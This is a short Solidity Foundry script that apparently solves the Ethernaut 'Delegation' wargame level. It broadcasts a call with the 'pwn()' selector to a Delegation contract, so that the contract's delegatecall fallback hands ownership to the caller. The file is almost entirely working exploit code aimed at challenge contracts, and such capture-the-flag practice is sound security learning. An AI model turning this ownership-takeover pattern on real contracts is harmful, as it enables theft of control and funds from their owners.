pragma solidity >=0.4.22 <0.9.0;

import "../src/Challenge/Delegate.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";

contract DelegateCracker is Script {
    Delegation delegation;
    Delegate delegate;

    function run() public {
        delegate = Delegate(0xFf745ce90A940275d60a7b70d767648C9FaE5182);
        delegation = Delegation(0x92540D68c53152A2EDfBF4cCc5B7c3DFdCbd2B4D);
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        // address ownerAddy = delegate.owner();
        // console.log(ownerAddy);
        (bool success, bytes memory data) = address(delegation).call(
            abi.encodeWithSignature("pwn()")
        );
        vm.stopBroadcast();
    }
}
